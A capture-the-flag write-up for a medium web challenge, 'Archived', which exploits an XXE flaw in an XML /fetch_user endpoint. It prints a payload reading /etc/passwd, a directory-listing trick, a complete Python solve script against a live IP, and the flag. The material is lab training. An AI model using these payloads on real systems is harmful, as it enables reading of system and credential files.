---
title: "Archived"
ctf: "Safaricom CTF"
date: 2026-10-06
category: web
difficulty: medium
points: 250
flag_format: "safctf{...}"
author: "Strawhats"
---

# Archived

> **Category:** XXE · **Points:** 250 · **Difficulty:** medium

## Discovery, analysis & exploitation

The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.

Target: `http://54.72.82.22:8230`

## Endpoint

- `GET /` — Werkzeug/Flask "RELIC SOCIETY" page; JS posts XML to `/fetch_user`.
- `POST /fetch_user` — `Content-Type: application/xml`, body `<request><id>ID</id></request>`.
  - Known ids 1-4 return a user record; unknown ids are echoed back in `<id>`.
  - Error shapes observed:
    - `<error>Missing id element.</error>` — no `<id>` in the document.
    - `<error>Invalid input</error>` — XML parse error (also raised when an
      external entity points at a missing / permission-denied file).

## Vulnerability

The parser resolves external general entities and reflects the expanded value
in the `<id>` element of the response. Classic in-band file read with no OOB
needed.

```xml
<?xml version="1.0"?>
<!DOCTYPE request [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<request><id>&xxe;</id></request>
```

Bonus: passing a **directory** as the `file://` entity returns a
newline-separated directory listing (e.g. `file:///` -> `bin boot dev etc ...`).
This is what the blurb's *"a catalog card points to a second archive"* means:
list `/` to find the randomised flag filename.

## Exploitation

1. `file:///` lists root, revealing `flag8b9d5b8e264a.txt`.
2. Read `file:///flag8b9d5b8e264a.txt` -> returns the flag in `<id>`.

## Notes / constraints

- `/proc` is not readable through the entity (`Invalid input`), but `/etc`,
  `/usr`, `/sys` and regular dirs are.
- App artifacts on the box: `/home/ctfuser/app.jar` (Tomcat), `/opt/java`,
  `/.rock` — the Flask front is a shim over a Java service.

## Repro

`python solve.py` (uses `requests`) prints the flag.

## Artifacts

No binaries downloaded; nothing to hash.

## Solve script

`xxe/archived/solve.py`:

```python
#!/usr/bin/env python
"""Archived (XXE, 250 pts) - http://54.72.82.22:8230

The /fetch_user endpoint parses a client-supplied XML body with an
XML parser that resolves external entities and echoes the value back
(and, notably, accepts a directory as a file:// entity, returning a
newline-separated directory listing).

Classic file-read XXE:
  1. list "/" to discover the randomised flag filename (the "catalog
     card points to a second archive" hint),
  2. read that file and pull the flag out.

Run:  python solve.py
"""
import re
import sys

import requests

BASE = "http://54.72.82.22:8230"
URL = BASE + "/fetch_user"

TEMPLATE = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE request [<!ENTITY xxe SYSTEM "file://%s">]>'
    '<request><id>&xxe;</id></request>'
)


def read(path):
    """Return the file/dir contents at `path`, or None if the parser refused."""
    r = requests.post(
        URL,
        data=TEMPLATE % path,
        headers={"Content-Type": "application/xml"},
        timeout=15,
    )
    body = r.text
    if "<error>" in body:
        return None
    m = re.search(r"<id>(.*)</id>", body, re.S)
    return m.group(1) if m else body


def main():
    root = read("/")
    if root is None:
        sys.exit("[-] XXE failed: could not list /")

    names = [n for n in root.split("\n") if n.strip()]
    print("[*] / contains:", " ".join(names))

    flag_files = [n for n in names if n.startswith("flag") and n.endswith(".txt")]
    if not flag_files:
        sys.exit("[-] no flag*.txt found at /")

    for name in flag_files:
        content = read("/" + name)
        if content:
            m = re.search(r"safctf\{[0-9a-f]{32}\}", content)
            if m:
                print("[+] flag file:", "/" + name)
                print("[+] FLAG:", m.group(0))
                return m.group(0)

    sys.exit("[-] flag file found but no safctf{...} inside")


if __name__ == "__main__":
    main()
```

## Tools

**Used in this solve:**

- Python `requests` (HTTP client)
- Python 3 (solver)

**Other tools that fit this category:**

- Burp Suite + the Collaborator (OOB XXE)
- ffuf
- `defusedxml` (to study the fixed behaviour)
- XXEinjector

## Flag

```
safctf{960c0e8a73c24bd9b1aee314ded96157}
```
